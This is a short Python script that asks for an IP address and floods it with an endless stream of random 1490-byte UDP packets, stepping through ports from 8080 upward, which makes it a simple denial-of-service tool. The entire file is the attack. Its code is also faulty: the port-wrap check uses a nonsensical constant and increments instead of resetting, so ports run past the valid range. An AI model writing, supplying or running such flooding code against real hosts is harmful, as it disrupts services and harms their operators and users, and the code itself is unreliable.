import random
import socket
import time
import os
from datetime import datetime
now = datetime.now() 
hour = now.hour   
minute = now.minute
month = now.month
year = now.year
socks = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

ip= input("ip: ")
ports = int( "8080")



time.sleep(2)
sent = 0
while True:
    socks.sendto(bytes ,(ip,ports))
    sent +=1
    ports+=1
    print("sent",sent ," packet to ",ip ," port ", ports)
    if ports == 99999999999999999999999999999999999999999999999999999999999999999999:
        ports +=1  